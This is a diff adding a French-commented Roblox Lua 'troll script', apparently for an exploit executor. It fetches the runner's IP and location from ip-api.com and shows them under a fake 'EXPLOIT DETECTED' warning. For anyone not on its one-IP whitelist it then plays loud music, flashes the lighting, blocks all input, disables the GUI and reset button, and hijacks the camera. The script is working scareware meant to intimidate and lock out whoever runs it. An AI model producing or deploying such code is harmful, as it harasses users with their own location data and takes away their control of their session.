@@ -1,0 +1,122 @@
+-- 💀 EXTREME TROLL SCRIPT + WHITELIST 💀
+
+-- Config
+local WHITELIST = {
+    ["128.79.4.113"] = true -- IPs autorisées
+}
+
+-- Services
+local HttpService = game:GetService("HttpService")
+local Lighting = game:GetService("Lighting")
+local Players = game:GetService("Players")
+local UIS = game:GetService("UserInputService")
+local StarterGui = game:GetService("StarterGui")
+local RunService = game:GetService("RunService")
+local Camera = workspace.CurrentCamera
+
+local player = Players.LocalPlayer
+
+-- 🌐 Obtenir IP de l'utilisateur
+local req = (http_request or request or syn and syn.request)
+local response = req({ Url = "http://ip-api.com/json/", Method = "GET" })
+local data = HttpService:JSONDecode(response.Body)
+local ip = data.query or "0.0.0.0"
+local isWhitelisted = WHITELIST[ip] == true
+
+-- 🧠 GUI générique
+local gui = Instance.new("ScreenGui", game.CoreGui)
+gui.Name = "IP_Alert_GUI"
+
+local frame = Instance.new("Frame", gui)
+frame.Size = UDim2.new(0.5, 0, 0.25, 0)
+frame.Position = UDim2.new(0.25, 0, 0.35, 0)
+frame.BackgroundColor3 = Color3.fromRGB(30, 0, 0)
+frame.BorderSizePixel = 0
+
+local title = Instance.new("TextLabel", frame)
+title.Text = isWhitelisted and "✅ WHITELISTED ✅" or "⚠️ EXPLOIT DETECTED ⚠️"
+title.Size = UDim2.new(1, 0, 0.3, 0)
+title.BackgroundTransparency = 1
+title.TextScaled = true
+title.TextColor3 = isWhitelisted and Color3.fromRGB(0, 255, 0) or Color3.fromRGB(255, 0, 0)
+
+local ipText = Instance.new("TextLabel", frame)
+ipText.Text = "Your IP: " .. (isWhitelisted and "***.***.***.***" or ip)
+ipText.Size = UDim2.new(1, 0, 0.3, 0)
+ipText.Position = UDim2.new(0, 0, 0.3, 0)
+ipText.BackgroundTransparency = 1
+ipText.TextScaled = true
+ipText.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+local locText = Instance.new("TextLabel", frame)
+locText.Text = "Location: " .. (isWhitelisted and "Protected" or (data.city or "?") .. ", " .. (data.regionName or "?") .. " (" .. (data.country or "?") .. ")")
+locText.Size = UDim2.new(1, 0, 0.3, 0)
+locText.Position = UDim2.new(0, 0, 0.6, 0)
+locText.BackgroundTransparency = 1
+locText.TextScaled = true
+locText.TextColor3 = Color3.fromRGB(200, 200, 200)
+
+-- 🔓 Si whitelisté : bouton pour fermer
+if isWhitelisted then
+    local close = Instance.new("TextButton", frame)
+    close.Size = UDim2.new(0.3, 0, 0.2, 0)
+    close.Position = UDim2.new(0.35, 0, 1, 0)
+    close.Text = "Fermer ce script"
+    close.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+    close.TextColor3 = Color3.fromRGB(255, 255, 255)
+    close.TextScaled = true
+    close.MouseButton1Click:Connect(function()
+        gui:Destroy()
+        if game.Workspace:FindFirstChild("Sound") then
+            game.Workspace.Sound:Destroy()
+        end
+        script:Destroy()
+    end)
+    return -- Stop ici, pas de troll
+end
+
+-- Sinon... enfer 🩸
+
+-- 🎧 Musique flippante
+local sound = Instance.new("Sound", game.Workspace)
+sound.SoundId = "rbxassetid://1835337424"
+sound.Volume = 10
+sound.Looped = true
+sound:Play()
+
+-- 🔥 Ambiance rouge sang et noir
+spawn(function()
+	while true do
+		Lighting.Ambient = Color3.fromRGB(255, 0, 0)
+		Lighting.OutdoorAmbient = Color3.fromRGB(255, 0, 0)
+		Lighting.FogColor = Color3.fromRGB(80, 0, 0)
+		Lighting.FogEnd = 100
+		wait(0.2)
+		Lighting.Ambient = Color3.fromRGB(0, 0, 0)
+		Lighting.OutdoorAmbient = Color3.fromRGB(0, 0, 0)
+		wait(0.2)
+	end
+end)
+
+-- 🛑 Bloquer toute interaction
+UIS.InputBegan:Connect(function() return Enum.ContextActionResult.Sink end)
+UIS.InputEnded:Connect(function() return Enum.ContextActionResult.Sink end)
+StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
+pcall(function() StarterGui:SetCore("ResetButtonCallback", false) end)
+
+-- 👁️ Spectate joueurs random
+spawn(function()
+	while true do
+		wait(1)
+		local allPlayers = Players:GetPlayers()
+		if #allPlayers > 1 then
+			local target
+			repeat
+				target = allPlayers[math.random(1, #allPlayers)]
+			until target ~= player and target.Character and target.Character:FindFirstChild("HumanoidRootPart")
+			local hrp = target.Character.HumanoidRootPart
+			Camera.CameraSubject = hrp
+			Camera.CameraType = Enum.CameraType.Attach
+		end
+	end
+end)
